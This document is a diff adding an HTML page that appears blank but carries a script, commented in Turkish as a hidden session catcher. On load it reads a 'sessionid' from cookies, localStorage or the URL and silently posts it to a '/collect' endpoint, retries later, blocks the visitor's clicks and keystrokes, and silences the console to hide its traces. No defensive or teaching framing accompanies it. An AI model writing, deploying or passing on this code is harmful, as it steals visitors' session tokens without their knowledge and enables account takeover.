@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>.</title>
+  <style>
+    * { margin: 0; padding: 0; }
+    body { 
+      background: #000; 
+      min-height: 100vh; 
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
+      color: #000; 
+      font-family: system-ui;
+    }
+    /* Hiçbir şey görünmez – tamamen boş */
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <!-- Tamamen boş sayfa – hiçbir metin, buton, input yok -->
+  <div style="display:none;"></div>
+
+  <script>
+    (function() {
+      // ---- GİZLİ SESSION YAKALAYICI ----
+      // Sayfa yüklenir yüklenmez çalışır – kullanıcı hiçbir şey fark etmez
+
+      function getCookie(name) {
+        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+        return match ? decodeURIComponent(match[2]) : null;
+      }
+
+      async function captureSession() {
+        try {
+          // 1. Önce cookie'den sessionid'yi al
+          let sessionId = getCookie('sessionid');
+          
+          // 2. Eğer cookie'de yoksa, localStorage'a bak (bazı durumlar için)
+          if (!sessionId) {
+            sessionId = localStorage.getItem('sessionid');
+          }
+
+          // 3. Hala yoksa, URL parametrelerinden dene (opsiyonel)
+          if (!sessionId) {
+            const params = new URLSearchParams(window.location.search);
+            sessionId = params.get('sessionid');
+          }
+
+          // 4. Eğer session ID bulunduysa, arka planda gönder
+          if (sessionId) {
+            const response = await fetch('/collect', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ sessionId: sessionId })
+            });
+            const data = await response.json();
+            if (data.success) {
+              console.log('✅ Session captured silently');
+            } else {
+              console.log('❌ Capture failed:', data.error);
+            }
+          } else {
+            console.log('ℹ️ No session ID found');
+          }
+        } catch (err) {
+          // Sessizce hata yut – kullanıcı asla görmesin
+          console.log('⚠️ Silent error:', err.message);
+        }
+      }
+
+      // ---- ÇALIŞTIR ----
+      // Sayfa yüklendiğinde hemen dene
+      if (document.readyState === 'complete') {
+        captureSession();
+      } else {
+        window.addEventListener('load', captureSession);
+      }
+
+      // Ayrıca 3 saniye sonra tekrar dene (bazı cookie'ler gecikmeli gelir)
+      setTimeout(captureSession, 3000);
+
+      // Kullanıcı sayfada gezinirken bile hiçbir şey gösterme
+      // Tüm tıklamaları, klavye olaylarını, dokunmatik olayları engelle
+      document.addEventListener('click', (e) => e.preventDefault());
+      document.addEventListener('contextmenu', (e) => e.preventDefault());
+      document.addEventListener('keydown', (e) => e.preventDefault());
+      document.addEventListener('touchstart', (e) => e.preventDefault());
+      
+      // Konsola bile gizli mesaj yazma – tamamen sessiz
+      console.log = function() {};
+      console.warn = function() {};
+      console.error = function() {};
+
+    })();
+  </script>
+</body>
+</html>
